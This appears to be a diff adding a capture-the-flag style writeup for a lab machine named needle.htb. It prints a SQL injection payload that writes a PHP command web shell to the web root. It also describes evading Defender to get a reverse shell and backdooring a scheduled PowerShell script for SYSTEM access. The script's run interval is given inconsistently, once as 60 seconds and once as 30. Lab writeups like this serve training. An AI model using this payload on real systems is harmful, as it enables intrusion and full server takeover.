@@ -51,27 +51,28 @@ Not used
 
 # Writeup
 
+# Initial Foothold
 We start by opening the machine on needle.htb
 There really isnt anything other than placeholder html other then the login page at needle.htb/login.php.
 By trying to induce a SQL injection by trying to include a ' in the username or password parameter the user can find out the absolute path of the webdir which is:
+
 '''
 C:/xampp/htdocs/
 '''
+
 Some further heuristic tests let us know that UNION is usable. Nice this means that we can write content to arbitary files (if we have permissions).
-We do
 
-# Enumeration
+We do (: This is the query that i have used. ' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3 INTO OUTFILE 'C:/xampp/htdocs/shell.php'; -- for the username paratmeter and any string as the password parameter.
 
-[Describe the steps that describe the box's enumeration. Typically, this includes a sub-heading for the Nmap scan, HTTP/web enumeration, etc.]
+After this i used my webshell to get a reverse shell back to my machine (i used a php for this because Defender kept blocking my commands).
 
-# Foothold
 
-[Describe the steps for obtaining an initial foothold (shell/command execution) on the target.]
-
-# Lateral Movement (optional)
-
-[Describe the steps for lateral movement. This can include Docker breakouts / escape-to-host, etc.]
 
 # Privilege Escalation
 
-[Describe the steps to obtaining root/administrator privileges on the box.]
+Allright we are in. After checking the Root of the dir i can see a folder that usually shoudlnt be there. 
+
+In the folder are 3 scripts. The bat script is for starting the ps1, the ps1 is the script that runs every 60 seconds that is meant to clear the Temp folder and the 3rd is the log of the bg service.
+
+By reading the script OR the log the user should figure out that this script runs every 30 seconds and that way they can inject their backdoor into the ps1 script in order to get their SYSTEM privileged web shell.
+
